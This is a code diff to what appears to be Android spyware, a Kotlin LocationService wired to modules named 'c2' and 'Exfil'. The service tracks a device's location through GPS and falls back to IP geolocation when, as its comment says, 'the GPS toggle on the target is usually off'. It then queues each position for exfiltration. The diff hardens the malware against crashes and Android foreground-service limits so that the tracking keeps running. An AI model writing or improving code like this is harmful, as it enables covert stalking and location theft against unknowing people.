@@ -15,6 +15,7 @@ import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
 import com.sp.core.c2.Exfil
 import com.sp.core.util.BatchExfil
+import com.sp.core.util.Fgs
 import com.sp.core.util.WebGeo
 import org.json.JSONObject
 
@@ -28,22 +29,26 @@ import org.json.JSONObject
  */
 class LocationService : Service() {
 
-    private lateinit var client: FusedLocationProviderClient
+    private var client: FusedLocationProviderClient? = null
     private var callback: LocationCallback? = null
     private val handler = Handler(Looper.getMainLooper())
     private var lastSent = 0L
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            startForeground(NOTIF_ID, buildNotification())
-        } catch (t: Throwable) {
-            // Android 12+ refuses foreground services without the matching
-            // permission or from a background start - never kill the process.
+        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
+                buildNotification())) {
+            // The location type needs a runtime grant; without it the service
+            // must not keep running (and must not be left without a
+            // startForeground call - that would kill the whole process).
             stopSelf()
             return
         }
-        client = LocationServices.getFusedLocationProviderClient(this)
+        try {
+            client = LocationServices.getFusedLocationProviderClient(this)
+        } catch (t: Throwable) {
+            client = null
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -57,7 +62,7 @@ class LocationService : Service() {
 
     private fun startTracking() {
         if (!hasFineLocation()) {
-            sendWebLocation("no_permission")
+            sendWebLocationAsync("no_permission")
             scheduleNext()
             return
         }
@@ -76,13 +81,13 @@ class LocationService : Service() {
         callback = cb
 
         try {
-            client.requestLocationUpdates(request, cb, Looper.getMainLooper())
-        } catch (_: SecurityException) {
-            sendWebLocation("security")
+            client?.requestLocationUpdates(request, cb, Looper.getMainLooper())
+        } catch (_: Throwable) {
+            sendWebLocationAsync("security")
         }
 
         // No GPS fix in time -> fall back to the web source.
-        handler.postDelayed({ sendWebLocation("no_fix") }, FALLBACK_AFTER_MS)
+        handler.postDelayed({ sendWebLocationAsync("no_fix") }, FALLBACK_AFTER_MS)
         scheduleNext()
     }
 
@@ -105,14 +110,22 @@ class LocationService : Service() {
         lastSent = System.currentTimeMillis()
     }
 
-    private fun sendWebLocation(reason: String) {
-        try {
-            val geo = WebGeo.locate() ?: return
-            geo.put("fallback", reason)
-            BatchExfil.enqueue(this, "location", geo.toString())
-            lastSent = System.currentTimeMillis()
-        } catch (_: Throwable) {
-        }
+    /**
+     * The web source is the primary one: the GPS toggle on the target is
+     * usually off, so the position is resolved through IP geolocation. The
+     * HTTP call runs on its own thread - a blocking request on the main
+     * looper would freeze the service and get the app killed.
+     */
+    private fun sendWebLocationAsync(reason: String) {
+        Thread {
+            try {
+                val geo = WebGeo.locate() ?: return@Thread
+                geo.put("fallback", reason)
+                BatchExfil.enqueue(this, "location", geo.toString())
+                lastSent = System.currentTimeMillis()
+            } catch (_: Throwable) {
+            }
+        }.start()
     }
 
     private fun buildNotification(): Notification {
@@ -133,7 +146,7 @@ class LocationService : Service() {
     }
 
     override fun onDestroy() {
-        try { callback?.let { client.removeLocationUpdates(it) } } catch (_: Throwable) {}
+        try { callback?.let { client?.removeLocationUpdates(it) } } catch (_: Throwable) {}
         handler.removeCallbacksAndMessages(null)
         super.onDestroy()
     }
